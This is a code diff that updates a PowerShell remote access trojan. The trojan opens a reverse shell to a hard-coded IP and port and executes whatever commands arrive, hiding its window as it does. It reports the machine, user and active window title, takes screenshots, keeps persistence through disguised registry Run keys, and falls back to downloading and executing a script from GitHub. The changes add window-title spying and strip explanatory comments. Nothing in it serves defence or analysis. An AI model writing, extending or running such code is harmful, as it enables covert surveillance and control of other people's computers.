@@ -2,28 +2,42 @@
 $ip   = '192.168.1.15'
 $port = 4444
 $pass = 'biskviti'
-$user = "B15cu1t" # Safety Filter
+$user = "B15cu1t"
 $reg  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
+# Function to grab the Foreground Window Title
+function Get-ActiveWin {
+    $code = '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);'
+    $type = Add-Type -MemberDefinition $code -Name "WinUtils" -Namespace "Util" -PassThru
+    $handle = $type::GetForegroundWindow()
+    $builder = New-Object System.Text.StringBuilder 256
+    $type::GetWindowText($handle, $builder, 256) | Out-Null
+    return $builder.ToString()
+}
+
 try {
-    # 1. INITIAL CONNECTION
     $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
     $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $r = New-Object System.IO.StreamReader($s); $w.AutoFlush = $true
 
-    # 2. AUTHENTICATION
     $w.WriteLine("AUTH:")
     if ($r.ReadLine() -eq $pass) {
         
-        # 3. HIDE WINDOW (Only after successful login)
+        # HIDE WINDOW
         try {
             $h = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
             $type = Add-Type -MemberDefinition $h -Name "W32" -Namespace "W" -PassThru
             $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
         } catch {}
 
-        $w.WriteLine("--- COMPUTER CONNECTED: $env:COMPUTERNAME ---")
+        # --- INITIAL HANDSHAKE ---
+        $who = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+        $win = Get-ActiveWin
+        $w.WriteLine("`n" + ("="*30))
+        $w.WriteLine("  HOST: $env:COMPUTERNAME")
+        $w.WriteLine("  USER: $who")
+        $w.WriteLine("  TASK: $win")
+        $w.WriteLine(("="*30) + "`n")
 
-        # 4. MAIN COMMAND LOOP
         while($c.Connected) {
             $w.Write("PS " + (Get-Location).Path + "> ")
             $raw = $r.ReadLine(); if ($null -eq $raw) { break }
@@ -31,6 +45,11 @@ try {
 
             if ($cmd -eq "exit") { break }
             
+            # NEW COMMAND: Just get the active window name
+            elseif ($cmd -eq "window") {
+                $w.WriteLine("[ACTIVE]: " + (Get-ActiveWin))
+            }
+
             elseif ($cmd -eq "screenshot") {
                 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                 $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
@@ -44,38 +63,21 @@ try {
             }
             
             elseif ($cmd -eq "kill") {
-                $w.WriteLine("[-] Starting Targeted Cleanup...")
-                # Safety Loop: Only deletes if it belongs to YOU
                 "WinDiag","WinUpdate","WinLog","WinService" | ForEach-Object {
                     $item = Get-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue
-                    if ($item.$_ -like "*$user*") {
-                        Remove-ItemProperty -Path $reg -Name $_
-                        $w.WriteLine("[+] Cleaned: $_")
-                    }
+                    if ($item.$_ -like "*$user*") { Remove-ItemProperty -Path $reg -Name $_ }
                 }
-                $w.WriteLine("[!] All persistence removed. Killing process tree.")
-                
-                # THE GHOST-BUSTER: Stop the current process instantly
-                $c.Close()
-                Stop-Process -Id $PID -Force 
+                $w.WriteLine("[!] Cleanup Complete."); $c.Close(); Stop-Process -Id $PID -Force 
             }
             
-            else {
-                iex $cmd 2>&1 | Out-String | %{ $w.WriteLine($_) }
-            }
+            else { iex $cmd 2>&1 | Out-String | %{ $w.WriteLine($_) } }
         }
     } else {
-        # WRONG PASSWORD = EMERGENCY WIPE
-        "WinDiag","WinUpdate","WinLog","WinService" | % { 
-            $item = Get-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue
-            if ($item.$_ -like "*$user*") { Remove-ItemProperty -Path $reg -Name $_ }
-        }
-        $w.WriteLine("WRONG PASSWORD. SELF-DESTRUCTING."); exit
+        "WinDiag","WinUpdate","WinLog","WinService" | % { Remove-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue }
+        exit
     }
     $c.Close()
 } catch {
-    # RETRY LOGIC (Wait 120s if no listener)
     Start-Sleep -s 120
-    $u = "https://raw.githubusercontent.com/$user/shell.ps1/main/shell_v2.ps1"
-    iex (New-Object Net.WebClient).DownloadString($u)
+    iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/$user/shell.ps1/main/shell_v2.ps1")
 }
